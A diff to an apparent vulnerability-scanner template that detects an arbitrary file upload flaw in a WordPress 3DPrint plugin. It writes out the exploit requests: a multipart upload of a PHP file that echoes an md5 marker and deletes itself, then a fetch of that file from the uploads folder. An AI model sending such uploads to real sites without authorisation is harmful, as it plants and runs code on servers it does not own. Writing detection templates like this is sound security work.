@@ -19,6 +19,9 @@ info:
     max-request: 2
   tags: wpscan,edb,wordpress,wp,wp-plugin,fileupload,intrusive,3dprint
 
+variables:
+  string: "3dprint-arbitrary-file-upload"
+
 http:
   - raw:
       - |
@@ -35,18 +38,15 @@ http:
         Content-Disposition: form-data; name="file"; filename={{randstr}}.php
         Content-Type: text/php
 
-        <?php echo '3DPrint-arbitrary-file-upload'; ?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
         -----------------------------54331109111293931601238262353--
       - |
         GET /wp-content/uploads/p3d/{{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
 
     matchers:
-      - type: dsl
-        dsl:
-          - 'contains(header_2, "text/html")'
-          - "status_code_2 == 200"
-          - "contains(body_2, '3DPrint-arbitrary-file-upload')"
-        condition: and
-
-# digest: 490a0046304402204014e03adf59b73d5219aa2cf87a8a95ae9a277a296473ccbfb68c7d86e10fce022023c5fa1f1eee7bce47ce0038c7bb17f30859773a2017a1db43e095fb48f8a3d0:922c64590222798bb761d5b6d8e72950
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a004730450221008a28b4b47b5015952648a69d2a015d7ee703b58e0d53c69d3dd9a63c005ef55302206e2e52065a4b1f5c9198d9f027aa6f7bade93c2da3928956f1a05bffb97627ad:922c64590222798bb761d5b6d8e72950
